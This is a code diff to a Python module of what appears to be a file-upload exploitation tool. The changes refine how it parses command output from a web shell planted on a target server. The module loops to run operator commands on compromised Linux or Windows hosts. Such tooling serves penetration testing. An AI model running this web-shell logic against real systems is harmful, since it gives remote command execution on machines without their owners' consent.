@@ -10,7 +10,7 @@ from . import alerts
 from . import file_upload
 from . import config
 import base64
-
+import re
 
 def web_shell(options, headers, file_name, parameter_exists, operating_system):
     # Loop to run user commands on the target machine
@@ -67,11 +67,19 @@ def web_shell(options, headers, file_name, parameter_exists, operating_system):
 
             response, final_url = file_upload.send_get_request(headers, options, final_url)
 
-            # Remove the hexadecimal values that typically represents the start of a PNG file
-            response_text = response.text
+            if "BEGIN:" in response.text:
+                # Define the pattern for extracting text between "BEGIN:" and ":END"
+                pattern = re.compile(r'BEGIN:(.*?)\:END', re.DOTALL)
+                match = pattern.search(response.text)
+
+                if match:
+                    response_text = match.group(1).strip()  # strip() removes any extra whitespace
 
             print("")
-            print(response_text.rstrip())
+            if "BEGIN:" in response.text:
+                print(response_text)
+            else:
+                print(response.text.rstrip())
 
             if 'clear' in user_command.lower():
                 print("\033c", end="")
@@ -137,7 +145,7 @@ def interactive_shell(options, headers, file_name, content_type, upload_dir, is_
             alerts.warning("Interactive shell is activated, you can enter Linux system commands: ")
             results(options.url, file_name_to_save_in_file, content_type, upload_dir, is_magic_bytes,
                     options.output_dir, allowed_extension,
-                    current_time)
+                    current_time, module)
             operating_system = "Linux"
             web_shell(options, headers, file_name, parameter_exists, operating_system)
 
@@ -157,7 +165,7 @@ def interactive_shell(options, headers, file_name, content_type, upload_dir, is_
                 alerts.warning("Interactive shell is activated, you can enter Windows system commands: ")
                 results(options.url, file_name_to_save_in_file, content_type, upload_dir, is_magic_bytes,
                         options.output_dir, allowed_extension,
-                        current_time)
+                        current_time, module)
                 operating_system = "Windows"
                 web_shell(options, headers, file_name, parameter_exists, operating_system)
 
@@ -183,8 +191,16 @@ def interactive_shell(options, headers, file_name, content_type, upload_dir, is_
             response, final_url = file_upload.send_get_request(headers, options, final_url)
             file_data = open(f"assets/samples/sample.{options.file_extension}", 'r', encoding="latin-1")
             file_data = file_data.read()
+            response_text = response.text
+            if "BEGIN:" in response_text and file_data not in response_text:
+                # Define the pattern for extracting text between "BEGIN:" and ":END"
+                pattern = re.compile(r'BEGIN:(.*?)\:END', re.DOTALL)
+                match = pattern.search(response_text)
 
-            if "Is this message being rendered?" in response.text and file_data not in response.text:
+                if match:
+                    response_text = match.group(1).strip()  # strip() removes any extra whitespace
+
+            if "Is this message being rendered?" in response_text and file_data not in response_text:
                 success(
                     f"The sample file was executed and rendered successfully as {config.mimetypes[options.file_extension]}, congrats!")
                 while True:
@@ -208,7 +224,7 @@ def interactive_shell(options, headers, file_name, content_type, upload_dir, is_
                             if not skip_module:
                                 results(options.url, file_name_to_save_in_file, content_type, upload_dir,
                                         is_magic_bytes, options.output_dir, allowed_extension,
-                                        current_time)
+                                        current_time, module)
                                 exit(1)
                         else:
                             return exploit_machine
@@ -231,12 +247,12 @@ def interactive_shell(options, headers, file_name, content_type, upload_dir, is_
                 if not skip_module:
                     results(options.url, file_name_to_save_in_file, content_type, upload_dir, is_magic_bytes,
                             options.output_dir, allowed_extension,
-                            current_time)
+                            current_time, module)
                     exit(1)
             else:
                 results(options.url, file_name_to_save_in_file, content_type, upload_dir, is_magic_bytes,
                         options.output_dir, allowed_extension,
-                        current_time)
+                        current_time, module)
                 alerts.success(f"File uploaded successfully with: {file_name}")
                 return exploit_machine
 
